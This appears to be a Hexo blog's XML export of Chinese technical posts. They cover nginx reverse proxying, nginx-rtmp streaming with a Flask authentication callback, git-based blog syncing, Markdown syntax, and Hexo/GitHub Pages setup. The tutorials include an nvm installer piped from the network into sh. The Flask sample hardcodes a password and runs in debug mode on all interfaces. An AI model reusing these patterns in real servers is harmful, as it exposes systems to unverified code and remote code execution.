front_server&#123; server www.helloworld.com:9000;&#125;upstream api_server&#123; server www.helloworld.com:8080;&#125;server &#123; listen 80; server_name www.helloworld.com; location ~ ^/api/ &#123; include enable-cors.conf; proxy_pass http://api_server; rewrite "^/api/(.*)$" /$1 break; &#125; location ~ ^/ &#123; proxy_pass http://front_server; &#125;&#125;]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx+rtmp]]></title>
    <url>%2F2019%2F05%2F17%2Fnginx-rtmp%2F</url>
    <content type="text"><![CDATA[nginx+rtmp 搭建视频直播服务器服务器安装配置 windows安装包(已编译好的版本)参考： nginx for windows windows下搭建基于nginx的rtmp服务器 在Windows下搭建基于nginx的视频直播和点播系统 搬运源码（未编译） Car-eye-RTMP-server(github) car-eye-http-flv-module nginx+rtmp在windows下编译 Windows下编译nginx-rtmp-module windows下编译nginx+nginx_rtmp_modue(vs2013) CentOS搭建nginx+rtmp服务器 nginx+rtmp直播流服务搭建 centos7 centos7 Nginx+rtmp 搭建流媒体服务器 linux下建议将nginx.conf中的http端口改为1024以上，好像是80端口每次运行都需要su权限。 Nginx搭建rtmp流媒体服务器 nginx服务器常用命令12345678910./nginx -v//查看nginx版本号./nginx -V //查看nginx详细的版本信息start ./nginx -c conf/nginx.conf //以nginx.conf的配置启动nginx./nginx -s stop//停止nginx服务器./nginx -s quit//停止nginx服务器./nginx -s reload//重启nginx服务器service nginx reload//重启nginx服务器./nginx -t (-c conf/nginx.conf)//检查配置文件是否正确./nginx -h//显示帮助信息./nginx -?//显示帮助信息 nginx+rtmp加入权限控制 本文参考： *rtmp-module官方wiki *视频直播点播nginx-rtmp开发手册中文版(参考wiki版本粗译) 如何给 nginx rtmp 服务加入鉴权机制(改源码) *「自己开发直播」实现nginx-rtmp-module多频道输入输出与权限控制 nginx-rtmp-module授权机制实现直播推流多房间授权认证 nginx-rtmp-module 权限控制 nginx-rtmp加入权限验证的简单方法 视频直播点播nginx-rtmp开发手册中文版 *nginx.conf中关于nginx-rtmp-module配置指令详解 *nginx-rtmp多房间和授权实现 *博客比较有用 nginx的rtmp-module默认不限制推流权限、播放权限。 想加入权限验证有很多种方法。 其中一个是改源码，一个是利用nginx+rtmp的配置文件调用后台接口进行验证。 第一种方法没成功过，第二种方法比较简单。此文介绍第二种方法，第一种方法可见博客-&gt;如何给 nginx rtmp 服务加入鉴权机制(改源码) 原理主要是利用on_publish跳转到当前配置的一个“location”，在这里进行验证。关键点在于rtmp application节点下面要配置“notify_method get;”为什么呢？因为跳转的时候，默认以POST方式传输参数，修改成GET方式，nginx配置里就可以轻松处理了。（当然nginx通过配置文件也可以处理post，只是复杂一些）。 我们在此使用python的后台框架flask处理on_publish的post请求。 后台返回http200即为通过验证，返回http500即为验证失败，服务器拒绝连接。 nginx的配置文件（位于nginx安装目录下：…/nginx/conf/nginx.conf）修改如下: 12345678910111213141516171819202122rtmp &#123;4server &#123;44#listen 1935;44listen 10077;44chunk_size 4000;44application live &#123;444live on;444on_publish http://localhost:10078/user/auth;//后面的url即flask监听的地址44444&#125;4application hls &#123;444live on;444hls on;444#hls_path ../nginx-1.7.11.3-Gryphon/html/hls;444hls_path ../hls;444hls_fragment 5s;444on_publish http://localhost:10078/user/auth;44&#125;4&#125;&#125; python的flask后台代码如下： 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python# -*- coding:utf-8 -*-#https://www.jianshu.com/p/0d14ae8f081c#https://blog.csdn.net/wei389083222/article/details/78721074/#https://blog.csdn.net/weixin_34368949/article/details/85991563#验证只能用post方法#虽然流密钥的格式像是get类型，但是必须使用POST获取参数。from flask import Flask, request, Responseapp = Flask(__name__)#传入url格式为: xx.xx.xx.xx:10078/user/auth?usr=xxx&amp;passWord=xxx@app.route('/user/auth',methods=['POST'])def auth(): usr = request.form['usr']#从url后获取的数据 passWord = request.form['passWord'] print(usr,'\t',passWord) #此处可改为从数据库获取数据 auth_user='abc' auth_passWord='123' if auth_user == usr and auth_passWord ==passWord: return Response(response='success',status=200)#返回200状态码 else: return Response(status=500)#返回500状态码 #Flask.abort(404) return passWordif __name__ == '__main__': app.run(host='0.0.0.0',port=10078,debug=True) 播放权限也可用类似on_publish的验证方法进行控制。 on_play和on_publish 一样，只接受post方法，若需要接受get方法需要在rtmp中application的配置中添加notify_method get;，然后可在http{}部分中处理调用（这部分语法我不太清楚，不详细展开）。 以下是nginx.conf关于on_play的用法 on_play语法：on_play url上下文：rtmp, server, application描述：设置 HTTP 播放回调。每次一个客户分发播放命令时，一个 HTTP 请求异步发送，命令处理会挂起 - 直到它返回结果码。之后再解析 HTTP 结果码。 HTTP 2XX 返回码的话继续 RTMP 会话。 HTTP 3XX 返回码的话 重定向 RTMP 到另一个流，这个流的名字在 HTTP 返回头的 Location 获取。如果新流的名字起始于 rtmp:// 然后远程 relay 会被创建。relay 要求 IP 地址是指定的而不是域名，并且只工作在 1.3.10 版本以上的 nginx。另请参考 notify_relay_redirect。 其他返回码的话 RTMP 连接丢弃。重定向例子： 123456789101112131415161718192021222324252627 http &#123; location /local_redirect &#123; rewrite ^.*$ newname? permanent; &#125; location /remote_redirect &#123; # no domain name here, only ip rewrite ^.*$ rtmp://192.168.1.123/someapp/somename? permanent; &#125; &#125; rtmp &#123; application myapp1 &#123; live on; # stream will be redirected to 'newname' on_play http://localhost:8080/local_redirect; &#125; application myapp2 &#123; live on; # stream will be pulled from remote location # requires nginx &gt;= 1.3.10 on_play http://localhost:8080/remote_redirect; &#125;&#125; HTTP 请求接收到一些个参数。在 application/x-www-form-urlencoded MIME 类型下使用 POST 方法。以下参数会被传送给调用者： call=play。 addr - 客户端 IP 地址。 app - application 名。 flashVer - 客户端 flash 版本。 swfUrl - 客户端 swf url。 tcUrl - tcUrl。 pageUrl - 客户端页面 url。 name - 流名。出了上述参数之外其他所有播放命令参数显式地发送回调。例如如果一个流由 url rtmp://localhost/app/movie?a=100&amp;b=face&amp;foo=bar 访问，然后呢 a,b 和 foo 发送回调。on_play http://example.com/my_callback; 过程中使用到的额外软件 obs 手机端:快直播 ffmpeg推流（没用过）]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>rtmp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo+gitPages Synchronization]]></title>
    <url>%2F2019%2F05%2F16%2Fhexo-gitPages-Synchronization%2F</url>
    <content type="text"><![CDATA[Hexo+gitPages 的博客多端同步管理及迁移 本文参考 如何解决github+Hexo的博客多终端同步问题 利用Hexo在多台电脑上提交和更新github pages博客 搭建hexo博客并简单的实现多终端同步 hexo博客同步管理及迁移 主体的思路是将博文内容相关文件放在Github项目中master中，将Hexo配置写博客用的相关文件(包括博客内容主题等等)放在Github项目的hexo分支上，这个是关键，多终端的同步只需要对分支hexo进行操作。 同步的首次操作在创建了博客的目录下操作，push本地文件夹Hexo中的必要文件到yourname.github.io的hexo分支上。 只托管部分用于多终端的同步的文件 注意：使用第三方主题时，要删除第三方主题的.git文件夹删除，不然无法push到远程仓库 1234567git init //初始化本地仓库git add source //将必要的文件依次添加，有些文件夹如npm install产生的node_modules由于路径过长不好处理，所以这里没有用`git add .`命令了，而是依次添加必要文件，如下图所示,其实也可以用'git add .'命令，在.gitignore文件中加入不需要同步的文件即可git commit -m "Blog Source Hexo"git branch hexo //新建hexo分支git checkout hexo //切换到hexo分支上git remote add origin git@github.com:yourname/yourname.github.io.git //将本地与Github项目对接git push origin hexo //push到Github项目的hexo分支上 多出来的hexo的分支，用于文件同步，原有的master分支用于部署静态博客页面 在新终端进行更新博客先从github中把文件clone到本地，然后安装相应组件。然后通过git的提交同步内容，用hexo的命令部署博客到gitPages里。 12345678git clone -b hexo git@github.com:yourname/yourname.github.io.git //将Github中hexo分支clone到本地cd yourname.github.io //切换到刚刚clone的文件夹内npm install //注意，这里一定要切换到刚刚clone的文件夹内执行，安装必要的所需组件，不用再inithexo new post "new blog name" //新建一个.md文件，并编辑完成自己的博客内容git add source //经测试每次只要更新sorcerer中的文件到Github中即可，因为只是新建了一篇新博客，如果更改了主题样式的话还是建议用'git add .'git commit -m "XX"git push origin hexo //更新分支hexo d -g //push更新完分支之后将自己写的博客对接到自己搭的博客网站上，同时同步了Github中的master 已有博客的终端更新博客进入相应的文件夹，更新博客直行命令即可。 123456git pull origin hexo//先pull完成本地和远端的融合hexo new post "new blog"git add .git commit -m "Blog update"git push origin hexohexo d -g]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Markdown Syntax]]></title>
    <url>%2F2019%2F05%2F14%2FMarkdown-Syntax%2F</url>
    <content type="text"><![CDATA[Markdown Syntax 本文参考 Markdown基本语法(简书) Markdown官方文档 Markdown语法html支持 Markdown部分详细用法 标题Markdown 支持两种标题的语法，类 Setext 和类 atx 形式。 12345678Atx形式# 这是一级标题## 这是二级标题### 这是三级标题#### 这是四级标题##### 这是五级标题###### 这是六级标题 这是一级标题这是二级标题这是三级标题这是四级标题这是五级标题这是六级标题1234567Setext形式This is an H1=============This is an H2------------- This is an H1This is an H2根据标题生成目录1[TOC] 根据标题自动生成目录 [TOC] 字体1234**这是加粗的文字***这是倾斜的文字*`***这是斜体加粗的文字***~~这是加删除线的文字~~ 加粗测试 倾斜测试 斜体加粗测试 删除线测试 引用1234&gt;这是引用的内容&gt;&gt;这是引用的内容&gt;&gt;&gt;多重引用&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容 引用测试一 引用测试二 多重引用 引用测试 分割线1234-------******** 只要三个以上就可以 图片引用1234![图片alt](图片地址 ''图片title'')图片alt就是显示在图片下面的文字，相当于对图片内容的解释。图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加 12![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg "区块链") 插入带有链接的图片1234[[图片上传失败...(image-f83b77-1542510791300)]](http://www.baidu.com)&#123;:target="_blank"&#125; // 内链式[[图片上传失败...(image-4dc956-1542510791300)]][5]&#123;:target="_blank"&#125; // 引用式[5]: http://www.baidu.com [图片上传失败…(image-f83b77-1542510791300)]{:target=”_blank”} 内链式 [图片上传失败…(image-f83b77-1542510791300)]{:target=”blank”} 外链式 超链接引用12[超链接名](超链接地址 "超链接title")title可加可不加 12[简书](http://jianshu.com)[百度](http://baidu.com) baidu 注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。 1234&lt;a href="超链接地址" target="_blank"&gt;超链接名&lt;/a&gt;示例&lt;a href="https://www.jianshu.com/u/1f5ac0cf6a8b" target="_blank"&gt;简书&lt;/a&gt; 简书 视频插入注：Markdown 语法是不支持直接插入视频的 普遍的做法是 插入HTML的 iframe 框架，通过网站自带的分享功能获取，如果没有可以尝试第二种方法 第二是伪造播放界面，实质是插入视频图片，然后通过点击跳转到相关页面 代码1 注：多数第三方平台不支持插入&lt;iframe&gt;视频 1&lt;iframe height=498 width=510 src='http://player.youku.com/embed/XMjgzNzM0NTYxNg==' frameborder=0 'allowfullscreen'&gt;&lt;/iframe&gt; 代码2 1[[图片上传失败...(image-49aefe-1542510791300)]](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&amp;from=y1.3-tv-grid-1007-9910.86804.1-2#paction)&#123;:target="_blank"&#125; 列表1234567无序列表用任一种皆可- 列表内容+ 列表内容* 列表内容注意：- + * 跟内容之间都要有一个空格 列表（-） 列表（-） 列表（+） 列表（*） 1234567有序列表内容1.列表内容2.列表内容3.列表内容注意：序号跟内容之间要有空格 第一点 第二点 第三点 12345678910111213141516171819**上一级和下一级之间敲三个空格即可**- 一级无序列表内容 - 二级无序列表内容 - 二级无序列表内容 - 二级无序列表内容- 一级无序列表内容 1. 二级有序列表内容 2. 二级有序列表内容 3. 二级有序列表内容1. 一级有序列表内容 - 二级无序列表内容 - 二级无序列表内容 - 二级无序列表内容2. 一级有序列表内容 1. 二级有序列表内容 2. 二级有序列表内容 3. 二级有序列表内容 上一级和下一级之间敲三个空格即可 一级无序列表内容 二级无序列表内容 二级无序列表内容 二级无序列表内容 一级无序列表内容 二级有序列表内容 二级有序列表内容 二级有序列表内容 一级有序列表内容 二级无序列表内容 二级无序列表内容 二级无序列表内容 一级有序列表内容 二级有序列表内容 二级有序列表内容 二级有序列表内容 表格1234567891011表头|表头|表头---|:--:|---:内容|内容|内容内容|内容|内容第二行分割表头和内容。- 有一个就行，为了对齐，多加了几个文字默认居左-两边加：表示文字居中-右边加：表示文字居右注：原生的语法两边都要用 | 包起来。此处省略 12345姓名|技能|排行--|:--:|--:刘备|哭|大哥关羽|打|二哥张飞|骂|三弟 姓名 技能 排行 刘备 哭 大哥 关羽 打 二哥 张飞 骂 三弟 Typora编辑器中可以直接使用crtl+T，或者在菜单段落中找到表格生成 代码引用单行代码 1`代码内容` int main(){return 0;} 代码块 12345(```)language 代码... 代码... 代码...(```) 注：为了防止转译，前后三个反引号处加了小括号，实际是没有的。这里只是用来演示，实际中去掉两边小括号即可。 123456#include&lt;iostream&gt;using namespace std;int main()&#123; cout&lt;&lt; "hello markdown"; return 0;&#125; 格式化代码html版123&lt;pre&gt;## 这是一个不起作用的标题&lt;/pre&gt; ## 这是一个不起作用的标题 流程图注： st=&gt;start: 开始 的：后面保持空格 形参 实参 含义 tag st 标签 (可以自定义) =&gt; =&gt; 赋值 type start 类型 (6种类型) content 开始 描述内容 (可以自定义) :&gt;url http://www.baidu.com[blank] 链接与跳转方式 兼容性很差 6种类型 含义 start 启动 end 结束 operation 程序 subroutine 子程序 condition 条件 inputoutput 输出 形参 实参 含义 -&gt; -&gt; 连接 condition c1 条件 (布尔值,方向) (yes,right) 如果满足向右连接，4种方向：right ，left，up ，down 默认为：down 注：operation (程序); subroutine (子程序) ;condition (条件)，都可以在括号里加入连接方向。 123456789```flowst=&gt;start: 开始op=&gt;operation: My Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op&amp;``` 12345678st=&gt;start: 开始op=&gt;operation: My Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op&amp; 12345678910111213## 选项框```markdown- [x] 选项一- [ ] 选项二 需要注意的是：-、[x]、和选择一之间都要有空格，如果不下x[ ]中也要有空格 选项一 选项二 数学公式支持LaTex的数学公式，参考https://www.jianshu.com/p/2bbec51d756f 数学公式（MathJax)，参考https://www.jianshu.com/p/a0aa94ef8ab2 注：1个$左对齐，2个居中 12$$ x \href&#123;why-equal.html&#125;&#123;=&#125; y^2 + 1 $$$ x = &#123;-b \pm \sqrt&#123;b^2-4ac&#125; \over 2a&#125;. $ $$x \href{why-equal.html}{=} y^2 +1$$ 使用Typora的时候可以直接使用 $$+回车，或者用crtl+shift+M生成公式块（在段落菜单中的公式块） 参考https://blog.csdn.net/mingzhuo_126/article/details/82722455 脚注12Markdown[^1][^1]: Markdown是一种纯文本标记语言 // 在文章最后面显示脚注 Markdown^1 锚点注：只有标题支持锚点， 跳转目录方括号后 保持空格 123[公式标题锚点](#1)### [需要跳转的目录] &#123;#1&#125; // 方括号后保持空格 脚注标题锚点 123由于&#123;# 是hexo的标注语言hexo 中 &#123;# 属于保留字段 &#123;# ... #&#125;属于注释字段把```以外的&#123;#改成&#123;&#123; '&#123;#' &#125;&#125;即可解决 自动邮箱链接1&lt;xxx@outlook.com&gt; &#120;&#x78;&#120;&#64;&#x6f;&#x75;&#116;&#108;&#111;&#x6f;&#107;&#x2e;&#99;&#x6f;&#x6d; 时序图代码1 123456​```sequenceA-&gt;&gt;B: 你好Note left of A: 我在左边 // 注释方向，只有左右，没有上下Note right of B: 我在右边B--&gt;A: 很高兴认识你​ 12345678910111213141516171819202122**演示**![img](https:////upload-images.jianshu.io/upload_images/6912209-784ce9bb7beb6672.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/393/format/webp)**代码详解**注：`A-&gt;&gt;B: 你好` 后面可以不写文字，但是一定要在最后加上`：` Note left of A 代表注释在A的左边| 符号 | 含义 || ---- | -------- || `-` | 实线 || `&gt;` | 实心箭头 || `--` | 虚线 || `&gt;&gt;` | 空心箭头 |**代码2** 123456789起床-&gt;吃饭: 稀饭油条吃饭-&gt;上班: 不要迟到了上班-&gt;午餐: 吃撑了上班-&gt;下班:Note right of 下班: 下班了下班-&gt;回家:Note right of 回家: 到家了回家--&gt;&gt;起床:Note left of 起床: 新的一天 演示 转义字符由于markdown语法的原因，可以用\进行转义。]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo+gitpages]]></title>
    <url>%2F2019%2F05%2F14%2Fhexo-gitpages%2F</url>
    <content type="text"><![CDATA[hexo+gitPages搭建个人博客 本文参考 hexo 博客搭建 hexo官方文档 【持续更新】最全Hexo博客搭建+主题优化+插件配置+常用操作+错误分析 手把手教你搭建自己的个人博客（图文教程） 搭建篇 –使用Github+hexo搭建个人博客教程—总结自己爬过的坑) GitHub+Hexo 搭建个人网站详细教程 史上最详细的Hexo博客搭建图文教程 hexo优化 hexo博客改装和一些细节优化 https://www.chakid.com/2018/05/26/hexo博客改装和一些细节优化 Hexo NexT 博客后台管理指南 Hexo主题更改以及小功能的添加 hexo-NexT主题配置 NexT官方展示 NexT官方中文文档ReadME NexT源码 NexT文档 Hexo的Next主题详细配置 hexo的next主题个性化教程:打造炫酷网站 hexo的next主题个性化教程：打造炫酷网站 【持续更新】hexo next主题优化手册 可参考博客嘤 https://guanqr.com/tech/website/hexo-theme-next-customization/ https://biqianhan-zidi.github.io/ yilia主题 yilia主题源码（GitHub） yilia主题展示 hexo+gitpage优化： https://blog.lgf.im/2020/03/speedup-github-page/# hexo博客搭建安装前提安装 Hexo 相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序： Node.js (Should be at least nodejs 6.9) Git 如果您的电脑中已经安装上述必备程序，那么恭喜您！接下来只需要使用 npm 即可完成 Hexo 的安装。 1$ npm install -g hexo-cli 如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。 如果您的电脑中尚未安装所需要的程序，请根据以下安装指示完成安装。 Mac 用户 您在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install 安装命令行工具。 安装 Git Windows：下载并安装 git. Mac：使用 Homebrew, MacPorts ：brew install git;或下载 安装程序 安装。 Linux (Ubuntu, Debian)：sudo apt-get install git-core Linux (Fedora, Red Hat, CentOS)：sudo yum install git-core Windows 用户 由于众所周知的原因，从上面的链接下载git for windows最好挂上一个代理，否则下载速度十分缓慢。也可以参考这个页面，收录了存储于百度云的下载地址。 安装 Node.js安装 Node.js 的最佳方式是使用 nvm。 cURL: 1$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh Wget: 1$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh 安装完成后，重启终端并执行下列命令即可安装 Node.js。 1$ nvm install stable 或者您也可以下载 安装程序 来安装。 Windows 用户 对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选Add to PATH选项。另外，您也可以使用Git Bash，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用Git Bash来进行操作。 安装 Hexo所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。 1$ npm install -g hexo-cli 在安装的时候我用的是npm install hexo --save 关于npm命令回顾 npm install 命令最近在写Node程序的时候，突然对 npm install 的-save和-save-dev 这两个参数的使用比较混乱。其实博主在这之前对这两个参数的理解也是模糊的，各种查资料和实践后对它们之间的异同点略有理解。遂写下这篇文章避免自己忘记，同时也给node猿友一点指引。 我们在使用 npm install 安装模块的模块的时候 ，一般会使用下面这几种命令形式： 1234npm install moduleName # 安装模块到项目目录下`npm install -g moduleName # -g 的意思是将模块安装到全局，具体安装到磁盘哪个位置，要看 npm config prefix 的位置。npm install -save moduleName # -save 的意思是将模块安装到项目目录下，并在package文件的dependencies节点写入依赖。npm install -save-dev moduleName # -save-dev 的意思是将模块安装到项目目录下，并在package文件的devDependencies节点写入依赖。 那么问题来了，在项目中我们应该使用四个命令中的哪个呢？这个就要视情况而定了。下面对这四个命令进行对比，看完后你就不再这么问了。 npm install moduleName 命令 安装模块到项目node_modules目录下。 不会将模块依赖写入devDependencies或dependencies 节点。 运行 npm install 初始化项目时不会下载模块。 npm install -g moduleName 命令 安装模块到全局，不会在项目node_modules目录中保存模块包。 不会将模块依赖写入devDependencies或dependencies 节点。 运行 npm install 初始化项目时不会下载模块。 npm install -save moduleName 命令 安装模块到项目node_modules目录下。 会将模块依赖写入dependencies 节点。 运行 npm install 初始化项目时，会将模块下载到项目目录下。 运行npm install –production或者注明NODE_ENV变量值为production时，会自动下载模块到node_modules目录中。 npm install -save-dev moduleName 命令 安装模块到项目node_modules目录下。 会将模块依赖写入devDependencies 节点。 运行 npm install 初始化项目时，会将模块下载到项目目录下。 运行npm install –production或者注明NODE_ENV变量值为production时，不会自动下载模块到node_modules目录中。 建站安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。 &lt;folder&gt; 为hexo安装目录 123$ hexo init &lt;folder&gt;$ cd &lt;folder&gt;$ npm install 新建完成后，指定文件夹的目录如下： 12345678.├── _config.yml├── package.json├── scaffolds├── source| ├── _drafts| └── _posts└── themes _config.yml网站的 配置 信息，您可以在此配置大部分的参数。 package.json应用程序的信息。EJS, Stylus 和 Markdown renderer 已默认安装，您可以自由移除。 12345678910111213141516171819package.json&#123; "name": "hexo-site", "version": "0.0.0", "private": true, "hexo": &#123; "version": "" &#125;, "dependencies": &#123; "hexo": "^3.8.0", "hexo-generator-archive": "^0.1.5", "hexo-generator-category": "^0.1.3", "hexo-generator-index": "^0.2.1", "hexo-generator-tag": "^0.2.0", "hexo-renderer-ejs": "^0.3.1", "hexo-renderer-stylus": "^0.3.3", "hexo-renderer-marked": "^0.3.2", "hexo-server": "^0.3.3" &#125;&#125; scaffolds模版 文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。 Hexo的模板是指在新建的markdown文件中默认填充的内容。例如，如果您修改scaffold/post.md中的Front-matter内容，那么每次新建一篇文章时都会包含这个修改。 source资源文件夹是存放用户资源的地方。除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。 themes主题 文件夹。Hexo 会根据主题来生成静态页面。 配置您可以在 _config.yml 中修改大部分的配置。 网站 参数 描述 title 网站标题 subtitle 网站副标题 description 网站描述 author 您的名字 language 网站使用的语言 timezone 网站时区。Hexo 默认使用您电脑的时区。时区列表。比如说：America/New_York, Japan, 和 UTC 。 其中，description主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。author参数用于主题显示文章的作者。 网址 参数 描述 默认值 url 网址 root 网站根目录 permalink 文章的 永久链接 格式 :year/:month/:day/:title/ permalink_defaults 永久链接中各部分的默认值 网站存放在子目录 如果您的网站存放在子目录中，例如 http://yoursite.com/blog，则请将您的 url设为 http://yoursite.com/blog 并把 root 设为 /blog/。 目录 参数 描述 默认值 source_dir 资源文件夹，这个文件夹用来存放内容。 source public_dir 公共文件夹，这个文件夹用于存放生成的站点文件。 public tag_dir 标签文件夹 tags archive_dir 归档文件夹 archives category_dir 分类文件夹 categories code_dir Include code 文件夹 downloads/code i18n_dir 国际化（i18n）文件夹 :lang skip_render 跳过指定文件的渲染，您可使用 glob 表达式来匹配路径。 提示 如果您刚刚开始接触Hexo，通常没有必要修改这一部分的值。 文章 参数 描述 默认值 new_post_name 新文章的文件名称 :title.md default_layout 预设布局 post auto_spacing 在中文和英文之间加入空格 false titlecase 把标题转换为 title case false external_link 在新标签中打开链接 true filename_case 把文件名称转换为 (1) 小写或 (2) 大写 0 render_drafts 显示草稿 false post_asset_folder 启动 Asset 文件夹 false relative_link 把链接改为与根目录的相对位址 false future 显示未来的文章 true highlight 代码块的设置 相对地址 默认情况下，Hexo生成的超链接都是绝对地址。例如，如果您的网站域名为example.com,您有一篇文章名为hello，那么绝对链接可能像这样：http://example.com/hello.html，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。 分类 &amp; 标签 参数 描述 默认值 default_category 默认分类 uncategorized category_map 分类别名 tag_map 标签别名 日期 / 时间格式Hexo 使用 Moment.js 来解析和显示时间。 参数 描述 默认值 date_format 日期格式 YYYY-MM-DD time_format 时间格式 H:mm:ss 分页 参数 描述 默认值 per_page 每页显示的文章量 (0 = 关闭分页功能) 10 pagination_dir 分页目录 page 扩展 参数 描述 theme 当前主题名称。值为false时禁用主题 deploy 部署部分的设置 部署当执行完npm install之后即可通过hexo s或者hexo serve通过本地访问hexo博客。 此时博客已搭建在本地了。 方案一：GithubPages 创建Github账号 创建仓库， 仓库名为：&lt;Github账号名称&gt;.github.io 将本地Hexo博客推送到GithubPages 3.1. 安装hexo-deployer-git插件。在命令行（即Git Bash）运行以下命令即可： 1$ npm install hexo-deployer-git --save 3.2. 添加SSH key。 创建一个 SSH key 。在命令行（即Git Bash）输入以下命令， 回车三下即可： 1$ ssh-keygen -t rsa -C "邮箱地址" 添加到 github。 复制密钥文件内容（路径形如C:\Users\Administrator\.ssh\id_rsa.pub），粘贴到New SSH Key即可。 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功： 12$ ssh -T git@github.com$ yes 3.3. 修改_config.yml（在站点目录下）。文件末尾修改为： 123456# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy: type: git repo: git@github.com:&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io.git branch: master 注意：上面仓库地址写ssh地址，不写http地址。 3.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: git即成功推送： 12$ hexo g$ hexo d 等待1分钟左右，浏览器访问网址： https://&lt;Github账号名称&gt;.github.io 至此，您的Hexo博客已经搭建在GithubPages, 域名为https://&lt;Github账号名称&gt;.github.io。 方案二：GithubPages + 域名在方案一的基础上，添加自定义域名（您购买的域名）。 域名解析。 类型选择为 CNAME； 主机记录即域名前缀，填写为www； 记录值填写为自定义域名； 解析线路，TTL 默认即可。 仓库设置。 2.1. 打开博客仓库设置：https://github.com/&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io/settings 2.2. 在Custom domain下，填写自定义域名，点击save。 2.3. 在站点目录的source文件夹下，创建并打开CNAME.txt，写入你的域名（如www.simon96.online），保存，并重命名为CNAME。 等待10分钟左右。 浏览器访问自定义域名。 至此，您的Hexo博客已经解析到自定义域名，https://&lt;Github账号名称&gt;.github.io依然可用。 （可在github仓库中设置跳转至个人域名） 绑定域名虽然在Internet上可以访问我们的网站，但是网址是GitHub提供的:http://xxxx.github.io (知乎排版可能会出现”http://“字样) 而我们想使用我们自己的个性化域名，这就需要绑定我们自己的域名。这里演示的是在阿里云万网的域名绑定，在国内主流的域名代理厂商也就阿里云和腾讯云。登录到阿里云，进入管理控制台的域名列表，找到你的个性化域名，进入解析 然后添加解析 包括添加三条解析记录，192.30.252.153是GitHub的地址，你也可以ping你的 http://xxxx.github.io 的ip地址，填入进去。第三个记录类型是CNAME，CNAME的记录值是：你的用户名.http://github.io 这里千万别弄错了。第二步，登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名 点击save保存。第三步，进入本地博客文件夹 ，进入blog/source目录下，创建一个记事本文件，输入你的域名，对，只要写进你自己的域名即可。如果带有www，那么以后访问的时候必须带有www完整的域名才可以访问，但如果不带有www，以后访问的时候带不带www都可以访问。所以建议，不要带有www。这里我还是写了www(不建议带有www): 保存，命名为CNAME ，注意保存成所有文件而不是txt文件。 完成这三步，进入blog目录中，按住shift键右击打开命令行，依次输入： 123hexo cleanhexo ghexo d 这时候打开浏览器在地址栏输入你的个性化域名将会直接进入你自己搭建的网站。 方案三：GithubPages + CodingPages + 域名GithubPages 在国内较慢，百度不收录，而CodingPages 在国外较快。所以在方案二的基础上，添加CodingPages 。 创建Coding账号 创建仓库， 仓库名为：&lt;Coding账号名称&gt; 进入项目里『代码』页面，点击『一键开启静态 Pages』，稍等片刻CodingPages即可部署成功。 将本地Hexo博客推送到CodingPages 4.1. 鉴于创建GithubPages 时，已经生成过公钥。可直接复制密钥文件内容（路径形如C:\Users\Administrator\.ssh\id_rsa.pub）， 粘贴到新增公钥。 4.2. 测试是否添加成功。在命令行（即Git Bash）依次输入以下命令，返回“You’ve successfully authenticated”即成功： 12$ ssh -T git@git.coding.net$ yes 4.3. 修改_config.yml（在存放Hexo初始化文件的路径下）。文件末尾修改为： 123456789# Deployment## Docs: https://hexo.io/docs/deployment.htmldeploy:- type: git repo: git@github.com:&lt;Github账号名称&gt;/&lt;Github账号名称&gt;.github.io.git branch: master- type: git repo: git@git.dev.tencent.com:&lt;Coding账号名称&gt;/&lt;Coding账号名称&gt;.git branch: master 4.4. 推送到GithubPages。在命令行（即Git Bash）依次输入以下命令， 返回INFO Deploy done: 